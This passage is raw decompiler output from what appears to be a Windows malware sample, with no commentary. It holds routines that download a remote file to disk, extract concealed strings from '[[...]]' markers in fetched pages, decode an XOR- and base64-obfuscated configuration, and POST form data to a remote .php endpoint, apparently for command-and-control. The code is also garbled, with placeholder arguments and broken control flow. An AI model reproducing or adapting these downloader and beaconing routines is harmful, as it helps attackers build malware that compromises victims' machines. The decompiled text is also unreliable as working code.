    lstrcatA((char *)&lpBuffer, "edg499.dat");
    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, 0, NULL, 2, 128, NULL); // 0x40936d
    g31 = (int32_t)fileHandle;
    function_409280();
    CloseHandle((int32_t *)g31);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409c80 - 0x409db7
int32_t function_409c80(void) {
    // 0x409c80
    __chkstk();
    int32_t v1 = 0; // bp-10012, 0x409cb1
    int16_t * v2 = NULL; // bp-10028, 0x409cb7
    int32_t * v3 = InternetOpenW(NULL, (int32_t)&g32, (int16_t *)&g32, (int16_t *)&g32, (int32_t)&g32); // 0x409cbd
    if (v3 == NULL) {
        // 0x409cea
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = (int32_t)v3; // 0x409cbd
    int32_t v5 = v4; // bp-60, 0x409cd8
    int32_t * v6 = InternetOpenUrlW(v3, (int16_t *)&g32, (int16_t *)&g32, (int32_t)&g32, (int32_t)&g32, (int32_t)&g32); // 0x409cd9
    if (v6 == NULL) {
        // 0x409ce3
        InternetCloseHandle(v3);
        // 0x409cea
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = (int32_t)v6; // 0x409cd9
    int32_t v8; // bp-10008, 0x409c80
    int32_t v9 = &v8; // 0x409d12
    int32_t v10 = 0; // 0x409cff
    int32_t v11 = 0;
    int32_t v12 = &v5;
    *(int32_t *)(v12 - 4) = (int32_t)&v1;
    *(int32_t *)(v12 - 8) = 0x2710;
    *(int32_t *)(v12 - 12) = v9;
    *(int32_t *)(v12 - 16) = v7;
    InternetReadFile(&g32, &g32, (int32_t)&g32, &g32);
    int32_t * v13 = (int32_t *)(v12 - 20); // 0x409d22
    *v13 = v1 + v10;
    int32_t v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g32); // 0x409d23
    int32_t * v15 = (int32_t *)(v12 - 24); // 0x409d28
    *v15 = v10;
    int32_t * v16 = (int32_t *)(v12 - 28); // 0x409d29
    *v16 = v11;
    int32_t * v17 = (int32_t *)(v12 - 32); // 0x409d31
    *v17 = v14;
    _memcpy2();
    int32_t v18 = v12 - 36; // 0x409d37
    int32_t * v19 = (int32_t *)v18; // 0x409d37
    *v19 = v1;
    int32_t * v20 = (int32_t *)(v12 - 40);
    *v20 = v9;
    int32_t * v21 = (int32_t *)(v12 - 44);
    *v21 = v14 + v10;
    _memcpy2();
    *v13 = 0;
    *v15 = (int32_t)&v2;
    *v16 = v1;
    *v17 = v9;
    *v19 = 0;
    WriteFile(&g32, &g32, (int32_t)&g32, &g32, (struct _OVERLAPPED *)&g32);
    *v20 = v11;
    _free(&g32);
    v10 += v1;
    while (v1 != 0) {
        // 0x409d00
        v11 = v14;
        v12 = v18;
        *(int32_t *)(v12 - 4) = (int32_t)&v1;
        *(int32_t *)(v12 - 8) = 0x2710;
        *(int32_t *)(v12 - 12) = v9;
        *(int32_t *)(v12 - 16) = v7;
        InternetReadFile(&g32, &g32, (int32_t)&g32, &g32);
        v13 = (int32_t *)(v12 - 20);
        *v13 = v1 + v10;
        v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g32);
        v15 = (int32_t *)(v12 - 24);
        *v15 = v10;
        v16 = (int32_t *)(v12 - 28);
        *v16 = v11;
        v17 = (int32_t *)(v12 - 32);
        *v17 = v14;
        _memcpy2();
        v18 = v12 - 36;
        v19 = (int32_t *)v18;
        *v19 = v1;
        v20 = (int32_t *)(v12 - 40);
        *v20 = v9;
        v21 = (int32_t *)(v12 - 44);
        *v21 = v14 + v10;
        _memcpy2();
        *v13 = 0;
        *v15 = (int32_t)&v2;
        *v16 = v1;
        *v17 = v9;
        *v19 = 0;
        WriteFile(&g32, &g32, (int32_t)&g32, &g32, (struct _OVERLAPPED *)&g32);
        *v20 = v11;
        _free(&g32);
        v10 += v1;
    }
    // 0x409d92
    *v20 = v7;
    InternetCloseHandle((int32_t *)v14);
    *v21 = v4;
    InternetCloseHandle(&g32);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409dc0 - 0x409e79
int32_t function_409dc0(void) {
    int32_t v1; // 0x409dc0
    int32_t v2 = v1;
    v1 = v2 + 1;
    // 0x409dc0
    while (*(char *)v2 != 0) {
        // 0x409dd1
        v2 = v1;
        v1 = v2 + 1;
    }
    // 0x409dd8
    int32_t v3; // 0x409dc0
    int32_t v4 = v2 - v3; // 0x409dd8
    int32_t v5 = (v4 - (v4 >> 31)) / 2; // 0x409de6
    int32_t * v6 = _malloc(v5); // 0x409de9
    int32_t result = (int32_t)v6; // 0x409de9
    _memset(v6, 0, v5);
    if (v4 < 1) {
        // 0x409e67
        return result;
    }
    int32_t v7 = v3 + 1;
    int32_t v8 = 0; // 0x409e5f
    int32_t v9 = 0; // 0x409dc0
    while (true) {
        int32_t v10 = v9;
        int32_t v11 = v8;
        int32_t v12 = v11; // 0x409e0c
        v9 = v10;
        if (*(char *)(v11 + v3) == 91) {
            // 0x409e0e
            v12 = v11;
            v9 = v10;
            if (*(char *)(v11 + v7) == 91) {
                int32_t v13 = v11 + 2; // 0x409e15
                int32_t v14 = v13; // 0x409e1c
                int32_t v15 = 0; // 0x409e1c
                int32_t v16 = v10; // 0x409e1c
                v12 = v11;
                v9 = v10;
                if (v13 < v4) {
                    int32_t v17; // 0x409dc0
                    int32_t v18; // 0x409dc0
                    while (true) {
                        // 0x409e20
                        v18 = v16;
                        int32_t v19 = v15;
                        v17 = v14;
                        char v20 = *(char *)(v17 + v3); // 0x409e20
                        if (v20 == 93) {
                            // 0x409e28
                            if (*(char *)(v17 + v7) == v20) {
                                // break -> 0x409e71
                                break;
                            }
                        }
                        int32_t v21 = v19 + 1; // 0x409e2e
                        int32_t v22 = v18; // 0x409e31
                        if (v21 >= 1) {
                            uint64_t v23 = 0x55555556 * (int64_t)v21; // 0x409e38
                            v22 = v18;
                            if (v21 == 3 * ((int32_t)(v23 / 0x8000000000000000) + (int32_t)(v23 / 0x100000000))) {
                                // 0x409e4d
                                *(char *)(v18 + result) = v20;
                                v22 = v18 + 1;
                            }
                        }
                        int32_t v24 = v17 + 1; // 0x409e57
                        v14 = v24;
                        v15 = v21;
                        v16 = v22;
                        v12 = v11;
                        v9 = v22;
                        if (v24 >= v4) {
                            goto lab_0x409e5f;
                        }
                    }
                    // 0x409e71
                    v12 = v17 + 1;
                    v9 = v18;
                }
            }
        }
      lab_0x409e5f:
        // 0x409e5f
        v8 = v12 + 1;
        if (v8 >= v4) {
            // break -> 0x409e67
            break;
        }
    }
    // 0x409e67
    return result;
}

// Address range: 0x409e80 - 0x40a07a
int32_t function_409e80(void) {
    // 0x409e80
    int32_t v1; // 0x409e80
    if (v1 == 0 || (char)v1 == 0) {
        // 0x40a073
        return 0;
    }
    char * lpString = (char *)v1; // 0x409ea3
    int32_t * memoryHandle = LocalAlloc(64, lstrlenA(lpString) + 1); // 0x409eb1
    int32_t v2 = (int32_t)memoryHandle; // 0x409eb1
    char v3 = *lpString; // 0x409ef8
    int32_t v4 = 0;
    int32_t v5; // 0x409e80
    while (true) {
      lab_0x409ec4:;
        int32_t v6 = v4;
        char v7 = v3; // 0x409ec4
        if ((v7 & -33) < 91) {
            // 0x409ef3
            *(char *)(v6 + v2) = v7;
            v5 = v6 + 1;
            goto lab_0x409ef7;
        } else {
            // 0x409eda
            v5 = v6;
            if (v7 != 61 == v7 > 57 == ((v7 || 4) != 47)) {
                goto lab_0x409ef7;
            } else {
                // 0x409ef3
                *(char *)(v6 + v2) = v7;
                v5 = v6 + 1;
                goto lab_0x409ef7;
            }
        }
    }
  lab_0x409f00:;
    int32_t v8; // 0x409e80
    if (v4 < 1) {
        // 0x40a060
        LocalFree(memoryHandle);
        int32_t v9; // 0x409e80
        return v9 - v8;
    }
    char * v10 = (char *)v8; // 0x409e80
    int32_t v11 = 0;
    char v12 = *(char *)(v11 + v2); // 0x409f10
    int32_t v13 = v11 | 1; // 0x409f13
    int32_t v14; // 0x409e80
    int32_t v15 = v14 & -0x10000; // 0x409f16
    int32_t v16 = v15 | 0x4141; // 0x409f1e
    if (v13 < v4) {
        // 0x409f20
        v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
    }
    int32_t v17 = v16; // 0x409f2e
    int32_t v18 = v17; // 0x409f29
    if (v13 + 1 < v4) {
        // 0x409f2b
        v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
    }
    int32_t v19 = v18;
    int32_t v20 = v11 | 3; // 0x409f32
    int32_t v21 = 0x4100; // 0x409f37
    if (v20 < v4) {
        // 0x409f39
        v21 = 256 * (int32_t)*(char *)(v20 + v2);
    }
    uint32_t v22 = v21;
    unsigned char v23 = v12 - 65; // 0x409f42
    int32_t v24; // 0x409e80
    if (v23 < 26) {
        // 0x409f48
        v24 = v23;
    } else {
        if (v12 < 123) {
            // 0x409f55
            v24 = v12 - 71;
        } else {
            if (v12 < 58) {
                // 0x409f62
                v24 = v12 + 4;
            } else {
                // 0x409f67
                v24 = v12 != 43 ? 63 : 62;
            }
        }
    }
    char v25 = v19;
    int32_t v26; // 0x409e80
    int32_t v27; // 0x409f78
    int32_t v28; // 0x409f85
    int32_t v29; // 0x409f92
    int32_t v30; // 0x409f9d
    if (v25 < 91) {
        // 0x409f78
        v27 = v19 + 191 & 255 | v19 & -256;
        v14 = v27;
        v26 = v27;
    } else {
        if (v25 < 123) {
            // 0x409f85
            v28 = v19 + 185 & 255 | v19 & -256;
            v14 = v28;
            v26 = v28;
        } else {
            if (v25 < 58) {
                // 0x409f92
                v29 = v19 + 4 & 255 | v19 & -256;
                v14 = v29;
                v26 = v29;
            } else {
                // 0x409f97
                v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                v14 = v30;
                v26 = v30;
            }
        }
    }
    uint32_t v31 = v26 / 256; // 0x409fa0
    char v32 = v31;
    int32_t v33; // 0x409e80
    if (v32 < 91) {
        // 0x409fa8
        v33 = v31 + 191 & 255;
    } else {
        if (v32 < 123) {
            // 0x409fb7
            v33 = v31 + 185 & 255;
        } else {
            if (v32 < 58) {
                // 0x409fc6
                v33 = v31 + 4 & 255;
            } else {
                // 0x409fcd
                v33 = v32 != 43 ? 63 : 62;
            }
        }
    }
    int32_t v34 = v24 | v22;
    uint32_t v35 = v33;
    char v36 = v22 / 256;
    int32_t v37; // 0x409e80
    if (v36 < 91) {
        // 0x409fde
        v37 = v34 + 0xbf00 & 0xff00;
    } else {
        if (v36 < 123) {
            // 0x409fed
            v37 = v34 + 0xb900 & 0xff00;
        } else {
            if (v36 < 58) {
                // 0x409ffc
                v37 = v34 + 1024 & 0xff00;
            } else {
                // 0x40a003
                v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
            }
        }
    }
    int32_t v38 = v37;
    int32_t v39 = (int32_t)v10; // 0x40a00c
    int32_t v40 = v26 / 16 & 15 | 4 * v34 & 252; // 0x40a017
    *v10 = (char)v40;
    int32_t v41 = v39 + 1; // 0x40a01b
    char * v42 = (char *)v41; // 0x40a01c
    int32_t v43 = v14; // 0x40a022
    int32_t v44; // 0x409e80
    int32_t v45; // 0x409e80
    char * v46; // 0x409e80
    int32_t v47; // 0x40a02f
    int32_t v48; // 0x40a036
    if ((v43 & 0xff00) == 0x3d00) {
        // 0x40a03c
        v14 = v41;
        v45 = v41;
        v46 = v42;
        v44 = v40;
    } else {
        // 0x40a027
        v47 = 16 * v43 & 240 | v35 / 4;
        *v42 = (char)v47;
        v48 = v39 + 2;
        v14 = v48;
        v45 = v48;
        v46 = (char *)v48;
        v44 = v47;
    }
    int32_t v49 = v45; // 0x40a049
    int32_t v50 = v49; // 0x40a042
    char * v51 = v46; // 0x40a042
    if ((v22 & 0xff00) != 0x3d00) {
        // 0x40a044
        *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
        v50 = v14 + 1;
        v51 = (char *)v50;
    }
    char * v52 = v51;
    int32_t v53 = v11 + 4; // 0x40a052
    v10 = v52;
    while (v53 < v4) {
        // 0x409f10
        v11 = v53;
        v12 = *(char *)(v11 + v2);
        v13 = v11 | 1;
        v15 = v50 & -0x10000;
        v16 = v15 | 0x4141;
        if (v13 < v4) {
            // 0x409f20
            v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
        }
        // 0x409f24
        v17 = v16;
        v18 = v17;
        if (v13 + 1 < v4) {
            // 0x409f2b
            v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
        }
        // 0x409f32
        v19 = v18;
        v20 = v11 | 3;
        v21 = 0x4100;
        if (v20 < v4) {
            // 0x409f39
            v21 = 256 * (int32_t)*(char *)(v20 + v2);
        }
        // 0x409f40
        v22 = v21;
        v23 = v12 - 65;
        if (v23 < 26) {
            // 0x409f48
            v24 = v23;
        } else {
            if (v12 < 123) {
                // 0x409f55
                v24 = v12 - 71;
            } else {
                if (v12 < 58) {
                    // 0x409f62
                    v24 = v12 + 4;
                } else {
                    // 0x409f67
                    v24 = v12 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409f70
        v25 = v19;
        if (v25 < 91) {
            // 0x409f78
            v27 = v19 + 191 & 255 | v19 & -256;
            v14 = v27;
            v26 = v27;
        } else {
            if (v25 < 123) {
                // 0x409f85
                v28 = v19 + 185 & 255 | v19 & -256;
                v14 = v28;
                v26 = v28;
            } else {
                if (v25 < 58) {
                    // 0x409f92
                    v29 = v19 + 4 & 255 | v19 & -256;
                    v14 = v29;
                    v26 = v29;
                } else {
                    // 0x409f97
                    v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                    v14 = v30;
                    v26 = v30;
                }
            }
        }
        // 0x409fa0
        v31 = v26 / 256;
        v32 = v31;
        if (v32 < 91) {
            // 0x409fa8
            v33 = v31 + 191 & 255;
        } else {
            if (v32 < 123) {
                // 0x409fb7
                v33 = v31 + 185 & 255;
            } else {
                if (v32 < 58) {
                    // 0x409fc6
                    v33 = v31 + 4 & 255;
                } else {
                    // 0x409fcd
                    v33 = v32 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409fd6
        v34 = v24 | v22;
        v35 = v33;
        v36 = v22 / 256;
        if (v36 < 91) {
            // 0x409fde
            v37 = v34 + 0xbf00 & 0xff00;
        } else {
            if (v36 < 123) {
                // 0x409fed
                v37 = v34 + 0xb900 & 0xff00;
            } else {
                if (v36 < 58) {
                    // 0x409ffc
                    v37 = v34 + 1024 & 0xff00;
                } else {
                    // 0x40a003
                    v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
                }
            }
        }
        // 0x40a00c
        v38 = v37;
        v39 = (int32_t)v10;
        v40 = v26 / 16 & 15 | 4 * v34 & 252;
        *v10 = (char)v40;
        v41 = v39 + 1;
        v42 = (char *)v41;
        v43 = v14;
        if ((v43 & 0xff00) == 0x3d00) {
            // 0x40a03c
            v14 = v41;
            v45 = v41;
            v46 = v42;
            v44 = v40;
        } else {
            // 0x40a027
            v47 = 16 * v43 & 240 | v35 / 4;
            *v42 = (char)v47;
            v48 = v39 + 2;
            v14 = v48;
            v45 = v48;
            v46 = (char *)v48;
            v44 = v47;
        }
        // 0x40a03f
        v49 = v45;
        v50 = v49;
        v51 = v46;
        if ((v22 & 0xff00) != 0x3d00) {
            // 0x40a044
            *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
            v50 = v14 + 1;
            v51 = (char *)v50;
        }
        // 0x40a04f
        v52 = v51;
        v53 = v11 + 4;
        v10 = v52;
    }
    // 0x40a060
    LocalFree(memoryHandle);
    return (int32_t)v52 - v8;
  lab_0x409ef7:
    // 0x409ef7
    v4 = v5;
    int32_t v54; // 0x409e80
    int32_t v55 = v54 + 1; // 0x409ef7
    v3 = *(char *)v55;
    v54 = v55;
    if (v3 == 0) {
        // break -> 0x409f00
        goto lab_0x409f00;
    }
    goto lab_0x409ec4;
}

// Address range: 0x40a080 - 0x40a130
int32_t function_40a080(void) {
    // 0x40a080
    int32_t lpString; // 0x40a080
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)lpString)); // 0x40a08f
    int32_t v1 = function_409e80(); // 0x40a09b
    int32_t v2 = v1 - (v1 >> 31); // 0x40a0a6
    if (v2 < 2) {
        // 0x40a12a
        return memoryHandle;
    }
    int32_t v3 = 0; // 0x40a0ac
    int32_t v4 = 2 * v3 + memoryHandle;
    char v5 = *(char *)v4; // 0x40a0b0
    char v6 = v5 - 48; // 0x40a0b3
    char v7 = v6; // 0x40a0b8
    if (v6 >= 10) {
        if (v5 < 71) {
            // 0x40a0c9
            v7 = v5 - 55;
        } else {
            // 0x40a0d1
            v7 = v5 < 103 ? v5 - 87 : 0;
        }
    }
    char v8 = *(char *)(v4 + 1); // 0x40a0e2
    char v9 = v8 - 48; // 0x40a0e6
    char v10 = v9; // 0x40a0ec
    if (v9 >= 10) {
        if (v8 < 71) {
            // 0x40a0fe
            v10 = v8 - 55;
        } else {
            // 0x40a106
            v10 = v8 < 103 ? v8 - 87 : 0;
        }
    }
    unsigned char v11 = v10 + 16 * v7 ^ 35; // 0x40a11f
    *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
    v3++;
    while (v3 != v2 / 2) {
        // 0x40a0b0
        v4 = 2 * v3 + memoryHandle;
        v5 = *(char *)v4;
        v6 = v5 - 48;
        v7 = v6;
        if (v6 >= 10) {
            if (v5 < 71) {
                // 0x40a0c9
                v7 = v5 - 55;
            } else {
                // 0x40a0d1
                v7 = v5 < 103 ? v5 - 87 : 0;
            }
        }
        // 0x40a0e2
        v8 = *(char *)(v4 + 1);
        v9 = v8 - 48;
        v10 = v9;
        if (v9 >= 10) {
            if (v8 < 71) {
                // 0x40a0fe
                v10 = v8 - 55;
            } else {
                // 0x40a106
                v10 = v8 < 103 ? v8 - 87 : 0;
            }
        }
        // 0x40a118
        v11 = v10 + 16 * v7 ^ 35;
        *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
        v3++;
    }
    // 0x40a12a
    return memoryHandle;
}

// Address range: 0x40a130 - 0x40a331
int32_t function_40a130(void) {
    // 0x40a130
    __chkstk();
    int32_t v1; // 0x40a130
    _printf((char *)v1);
    int32_t v2; // 0x40a130
    int32_t v3 = v2;
    v2 = v3 + 1;
    while (*(char *)v3 != 0) {
        // 0x40a165
        v3 = v2;
        v2 = v3 + 1;
    }
    // 0x40a16c
    int32_t v4; // bp-1196, 0x40a130
    int16_t * v5 = (int16_t *)&v4; // bp-28, 0x40a179
    int32_t v6; // 0x40a130
    _mbstowcs((int16_t *)&v4, (char *)v6, 1 - v6 + v3);
    if (function_409c80() == 0) {
        // 0x40a320
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = function_409dc0(); // 0x40a197
    int32_t v8 = v7; // 0x40a1a0
    while (*(char *)v8 != 0) {
        // 0x40a1a3
        v8++;
    }
    int32_t v9 = v8 - v7; // 0x40a1aa
    int32_t * v10 = _malloc(v9 + 1); // 0x40a1b0
    v5 = (int16_t *)v7;
    _strncpy((char *)v10, (char *)v7, v9);
    *(char *)(v9 + (int32_t)v10) = 0;
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)function_40a080())); // 0x40a1d9
    function_409e80();
    v5 = (int16_t *)-0x78695a4c;
    int32_t * v11 = NULL; // bp-196, 0x40a228
    _memset(NULL, (int32_t)&g32, (int32_t)&g32);
    function_406f10();
    int32_t v12 = memoryHandle; // 0x40a24d
    while (*(char *)v12 != 0) {
        // 0x40a250
        v12++;
    }
    int32_t v13 = v12 - memoryHandle; // 0x40a257
    int32_t v14 = v13 & -0x7ffffff9; // 0x40a25b
    int32_t v15; // 0x40a130
    if (v14 >= 0) {
        // 0x40a268
        v15 = v13;
        if (v14 == 0) {
            goto lab_0x40a27c;
        } else {
            // 0x40a26a
            v15 = v13 + 8 + (v13 >> 31 & 7) & -8;
            goto lab_0x40a27c;
        }
    } else {
        // 0x40a263
        v15 = v13;
        if ((v13 + 7 & 7) == 7) {
            goto lab_0x40a27c;
        } else {
            // 0x40a26a
            v15 = v13 + 8 + (v13 >> 31 & 7) & -8;
            goto lab_0x40a27c;
        }
    }
  lab_0x40a27c:;
    int32_t v16 = (int32_t)&v5; // 0x40a247
    int32_t * v17; // 0x40a130
    if (v15 < 1) {
        // 0x40a27c
        v17 = (int32_t *)(v16 - 4);
    } else {
        int32_t * v18 = (int32_t *)(v16 - 4);
        int32_t v19 = (v15 - 1) / 8 + 1; // 0x40a294
        int32_t v20; // bp-5364, 0x40a130
        *v18 = (int32_t)&v20;
        function_406ab0((int32_t)&g32);
        v19--;
        v17 = v18;
        while (v19 != 0) {
            // 0x40a295
            *v18 = (int32_t)&v20;
            function_406ab0((int32_t)&g32);
            v19--;
            v17 = v18;
        }
    }
    // 0x40a2b5
    *v17 = (int32_t)"http://";
    int32_t v21 = (int32_t)&v11; // 0x40a2c6
    *(int32_t *)(v16 - 8) = v21;
    char * v22 = StrStrIA((char *)&g32, (char *)&g32); // 0x40a2c7
    int32_t v23; // bp-189, 0x40a130
    int32_t v24 = v22 == NULL ? v21 : (int32_t)&v23; // 0x40a2d7
    *(int32_t *)(v16 - 12) = (int32_t)"https://";
    *(int32_t *)(v16 - 16) = v24;
    int32_t v25 = StrStrIA((char *)&g32, (char *)&g32) == NULL ? v24 : v24 + 8;
    char v26 = *(char *)v25; // 0x40a2e9
    int32_t v27 = 0; // 0x40a2f5
    if (v26 != 47) {
        char v28 = v26; // 0x40a2fb
        int32_t v29 = 0; // 0x40a2fb
        int32_t v30 = v25; // 0x40a2fb
        v27 = v29;
        while (v28 != 0) {
            // 0x40a304
            *(char *)(v1 - v25 + v30) = v28;
            v29++;
            v30++;
            v28 = *(char *)v30;
            v27 = v29;
            if (v28 == 47) {
                // break -> 0x40a310
                break;
            }
            v27 = v29;
        }
    }
    // 0x40a310
    *(int32_t *)(v16 - 20) = memoryHandle;
    *(char *)(v27 + v1) = 0;
    LocalFree(&g32);
    // 0x40a320
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a340 - 0x40a5af
int32_t function_40a340(int32_t a1, int32_t * a2, int32_t a3) {
    int32_t v1 = 0x54534f50; // bp-20, 0x40a358
    __asm_rep_stosd_memset((char *)a1, 0, 0x88b8);
    int32_t v2; // bp-144, 0x40a340
    if (!InternetGetConnectedState(&v2, (int32_t)&g32)) {
        // 0x40a599
        return _40___security_check_cookie_40_4();
    }
    // 0x40a38f
    int32_t v3; // 0x40a340
    int32_t * v4 = InternetConnectA((int32_t *)g30, (char *)v3, 80, NULL, NULL, 3, 0, 1); // 0x40a3a2
    if (v4 == NULL) {
        // 0x40a3af
        return _40___security_check_cookie_40_4();
    }
    // 0x40a3c2
    int128_t v5; // 0x40a340
    __asm_movdqu_10(v5, __asm_movdqa(0x7061203a657079542d746e65746e6f43));
    int128_t v6; // 0x40a340
    __asm_movdqu_10(v6, __asm_movdqa(g11));
    int128_t v7; // 0x40a340
    __asm_movdqu_10(v7, __asm_movdqa(0x6465646f636e656c72752d6d726f66));
    int32_t * memoryHandle = LocalAlloc((int32_t)&g32, (int32_t)&g32); // 0x40a3ed
    int32_t v8 = (int32_t)memoryHandle; // bp-128, 0x40a3f3
    int32_t v9; // 0x40a340
    char * lpString = (char *)v9; // bp-208, 0x40a401
    int32_t v10 = (int32_t)&lpString; // 0x40a401
    *(char *)memoryHandle = 97;
    *(char *)(v8 + 1) = 112;
    *(char *)(v8 + 2) = 112;
    *(char *)(v8 + 3) = 108;
    *(char *)(v8 + 4) = 105;
    *(char *)(v8 + 5) = 99;
    *(char *)(v8 + 6) = 97;
    *(char *)(v8 + 7) = 116;
    *(char *)(v8 + 8) = 105;
    *(char *)(v8 + 9) = 111;
    *(char *)(v8 + 10) = 110;
    *(char *)(v8 + 11) = 47;
    *(char *)(v8 + 12) = 120;
    *(char *)(v8 + 13) = 45;
    *(char *)(v8 + 14) = 119;
    *(char *)(v8 + 15) = 119;
    *(char *)(v8 + 16) = 119;
    *(char *)(v8 + 17) = 45;
    *(char *)(v8 + 18) = 102;
    *(char *)(v8 + 19) = 111;
    *(char *)(v8 + 20) = 114;
    *(char *)(v8 + 21) = 109;
    *(char *)(v8 + 22) = 45;
    *(char *)(v8 + 23) = 117;
    *(char *)(v8 + 24) = 114;
    *(char *)(v8 + 25) = 108;
    *(char *)(v8 + 26) = 101;
    *(char *)(v8 + 27) = 110;
    *(char *)(v8 + 28) = 99;
    *(char *)(v8 + 29) = 111;
    *(char *)(v8 + 30) = 100;
    *(char *)(v8 + 31) = 101;
    *(char *)(v8 + 32) = 100;
    *(char *)(v8 + 33) = 0;
    int32_t v11 = v10; // 0x40a4f4
    int32_t v12 = 0; // 0x40a4f4
    int32_t v13 = v10; // 0x40a4f4
    int32_t v14 = 0; // 0x40a4f4
    if (lstrlenA(lpString) >= 1) {
        int32_t v15 = 0;
        int32_t v16 = v12 + v9;
        int32_t v17 = v15; // 0x40a4fa
        if (*(char *)v16 == 46) {
            // 0x40a4fc
            v17 = v15;
            if (*(char *)(v16 + 1) == 112) {
                // 0x40a503
                v17 = v15;
                if (*(char *)(v16 + 2) == 104) {
                    // 0x40a50a
                    v17 = v15;
                    if (*(char *)(v16 + 3) == 112) {
                        // 0x40a511
                        *(char *)(v16 + 4) = 0;
                        v17 = v16 + 5;
                    }
                }
            }
        }
        int32_t v18 = v17;
        v11 -= 4;
        v12++;
        uint32_t v19 = lstrlenA((char *)&g32); // 0x40a51d
        v13 = v11;
        v14 = v18;
        while (v12 < v19) {
            // 0x40a4f6
            v15 = v18;
            v16 = v12 + v9;
            v17 = v15;
            if (*(char *)v16 == 46) {
                // 0x40a4fc
                v17 = v15;
                if (*(char *)(v16 + 1) == 112) {
                    // 0x40a503
                    v17 = v15;
                    if (*(char *)(v16 + 2) == 104) {
                        // 0x40a50a
                        v17 = v15;
                        if (*(char *)(v16 + 3) == 112) {
                            // 0x40a511
                            *(char *)(v16 + 4) = 0;
                            v17 = v16 + 5;
                        }
                    }
                }
            }
            // 0x40a51b
            v18 = v17;
            v11 -= 4;
            v12++;
            v19 = lstrlenA((char *)&g32);
            v13 = v11;
            v14 = v18;
        }
    }
    int32_t v20 = (int32_t)v4; // 0x40a3a2
    *(int32_t *)(v13 - 4) = 0;
    *(int32_t *)(v13 - 8) = -0x7c000000;
    *(int32_t *)(v13 - 12) = (int32_t)&v8;
    *(int32_t *)(v13 - 16) = 0;
    *(int32_t *)(v13 - 20) = 0;
    *(int32_t *)(v13 - 28) = (int32_t)&v1;
    *(int32_t *)(v13 - 32) = v20;
    int32_t v21 = HttpOpenRequestA(); // 0x40a53e
    if (v21 == 0) {
        // 0x40a3af
        return _40___security_check_cookie_40_4();
    }
    // 0x40a54e
    int128_t v22; // bp-120, 0x40a340
    int32_t v23 = &v22; // 0x40a54e
    int32_t v24 = v23; // 0x40a551
    while (*(char *)v24 != 0) {
        // 0x40a554
        v24++;
    }
    // 0x40a55b
    *(int32_t *)(v13 - 36) = v14;
    *(int32_t *)(v13 - 40) = lstrlenA((char *)&g32);
    *(int32_t *)(v13 - 44) = v14;
    int32_t v25; // bp-119, 0x40a340
    *(int32_t *)(v13 - 48) = v24 - (int32_t)&v25;
    *(int32_t *)(v13 - 52) = v23;
    *(int32_t *)(v13 - 56) = v21;
    HttpSendRequestA(&g32, (char *)&g32, (int32_t)&g32, &g32, (int32_t)&g32);
    int32_t v26; // bp-140, 0x40a340
    *(int32_t *)(v13 - 60) = (int32_t)&v26;
    *(int32_t *)(v13 - 64) = 0x222e0;
    *(int32_t *)(v13 - 68) = a1;
    *(int32_t *)(v13 - 72) = v21;
    InternetReadFile(&g32, &g32, (int32_t)&g32, &g32);
    *(int32_t *)(v13 - 76) = v21;
    InternetCloseHandle(&g32);
    *(int32_t *)(v13 - 80) = v20;
    InternetCloseHandle(&g32);
    // 0x40a599
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a5b0 - 0x40a860
int32_t function_40a5b0(void) {
    // 0x40a5b0
    __chkstk();
    int32_t uFlags; // 0x40a5b0
    int32_t * memoryHandle = LocalAlloc(uFlags, (int32_t)&g32); // 0x40a5d9
    int32_t v1; // 0x40a5b0
    int32_t v2 = StrStrIA((char *)memoryHandle, (char *)&g32) == NULL ? v1 : v1 + 7;
    char * v3 = (char *)v2; // 0x40a5ff
    char * v4 = v3; // bp-40, 0x40a5ff
    int32_t v5 = StrStrIA(v3, "https://") == NULL ? v2 : v2 + 8;
    unsigned char v6 = *(char *)v5; // 0x40a609
    int32_t v7 = v1 & -256 | (int32_t)v6; // 0x40a609
    int32_t v8 = v7; // 0x40a60f
    int32_t v9 = 0; // 0x40a60f
    int32_t v10; // bp-84, 0x40a5b0
    if (v6 >= 1) {
        int32_t v11 = (int32_t)&v10 - v5; // 0x40a616
        int32_t v12 = v7; // 0x40a616
        int32_t v13 = v5; // 0x40a616
        int32_t v14 = 0; // 0x40a616
        char v15 = v12; // 0x40a618
        v8 = v12;
        while (v15 != 47) {
            // 0x40a61d
            *(char *)(v11 + v13) = v15;
            v14++;
            v13++;
            unsigned char v16 = *(char *)v13; // 0x40a621
            v12 = v12 & -256 | (int32_t)v16;
            v8 = v12;
            if (v14 >= (int32_t)v16) {
                // break -> 0x40a62c
                break;
            }
            v15 = v12;
            v8 = v12;
        }
        // 0x40a62c
        v9 = v14;
        if (v9 >= 50) {
            // 0x40a84d
            function_40b62e();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            return __asm_int3();
        }
    }
    int32_t v17 = (int32_t)memoryHandle; // 0x40a5d9
    int32_t v18 = v8;
